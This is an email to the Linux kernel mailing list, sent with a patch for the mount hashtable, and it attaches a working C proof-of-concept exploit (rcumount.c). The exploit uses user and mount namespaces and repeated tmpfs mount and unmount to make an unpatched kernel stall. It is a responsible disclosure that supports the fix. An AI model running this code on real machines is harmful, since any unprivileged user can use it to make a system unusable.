Return-Path: <linux-kernel-owner@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S1755757AbaCSVb5 (ORCPT <rfc822;w@1wt.eu>);
	Wed, 19 Mar 2014 17:31:57 -0400
Received: from swift.blarg.de ([78.47.110.205]:60002 "EHLO swift.blarg.de"
	rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
	id S1754030AbaCSVbz (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
	Wed, 19 Mar 2014 17:31:55 -0400
X-Greylist: delayed 469 seconds by postgrey-1.27 at vger.kernel.org; Wed, 19 Mar 2014 17:31:55 EDT
Date: Wed, 19 Mar 2014 22:24:04 +0100
From: Max Kellermann <max@duempel.org>
To: viro@zeniv.linux.org.uk, linux-kernel@vger.kernel.org
Subject: Re: [PATCH 1/2] fs/namespace: don't clobber mnt_hash.next while
 umounting
Message-ID: <20140319212404.GA29059@swift.blarg.de>
Mail-Followup-To: viro@zeniv.linux.org.uk, linux-kernel@vger.kernel.org
References: <20140319212226.25520.98808.stgit@rabbit.intern.cm-ag>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="qDbXVdCdHGoSgWSk"
Content-Disposition: inline
In-Reply-To: <20140319212226.25520.98808.stgit@rabbit.intern.cm-ag>
User-Agent: Mutt/1.5.21 (2010-09-15)
Sender: linux-kernel-owner@vger.kernel.org
List-ID: <linux-kernel.vger.kernel.org>
X-Mailing-List: linux-kernel@vger.kernel.org


--qDbXVdCdHGoSgWSk
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline

On 2014/03/19 22:22, Max Kellermann <mk@cm4all.com> wrote:
> In the presence of user+mount namespaces, this bug can be exploited by
> any unprivileged user to stall the kernel (denial of service by soft
> lockup).

Proof-of-concept exploit attached.

--qDbXVdCdHGoSgWSk
Content-Type: text/x-csrc; charset=us-ascii
Content-Disposition: attachment; filename="rcumount.c"

/*
 * Exploit for linux commit 48a066e72d970a3e225a9c18690d570c736fc455:
 * endless loop in __lookup_mnt() because the mount_hashtable does not
 * have enough RCU protection.
 *
 * How to use:
 *
 *   gcc -D_GNU_SOURCE -std=gnu99 -o rcumount rcumount.c && ./rcumount
 *
 * Wait a few minutes until "rcu_sched self-detected stall" appears.
 * The machine is now unusable.
 *
 * Author: Max Kellermann <max@duempel.org>
 */

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <sched.h>
#include <sys/mount.h>
#include <sys/stat.h>

static void stress(void) {
    /* make all mounts private so our namespace "owns" them */
    mount(NULL, "/", NULL, MS_PRIVATE|MS_REC, NULL);

    while (1) {
        /* stress the mount_hashtable which will at some point modify
           a list_head which is rcu-protected but still referenced by
           another kernel thread; this may or may not lead this other
           kernel thread into an endless loop inside __lookup_mnt()
           never sees the head again */
        if (mount("none", "/tmp", "tmpfs", 0, "size=16M,nr_inodes=256") == 0)
            umount2("/tmp", MNT_DETACH);

        /* ask the kernel to walk the mount hash, which may trigger
           the __lookup_mnt() */
        struct stat st;
        stat("/tmp/..", &st);
    }
}

static int fn(void *arg) {
    (void)arg;

    /* launch child processes */
    for (unsigned i = 0; i < 32; ++i) {
        if (fork() == 0) {
            stress();
            exit(0);
        }
    }

    /* cleanup */
    int status;
    do {} while(wait(&status) > 0);
    return 0;
}

int main(int argc, char **argv) {
    /* create a new user+vfs namespace which allows us to mount() */
    char stack[65536];
    clone(fn, stack + sizeof(stack), SIGCHLD|CLONE_NEWNS|CLONE_NEWUSER, NULL);

    /* cleanup */
    int status; wait(&status);
}

--qDbXVdCdHGoSgWSk--
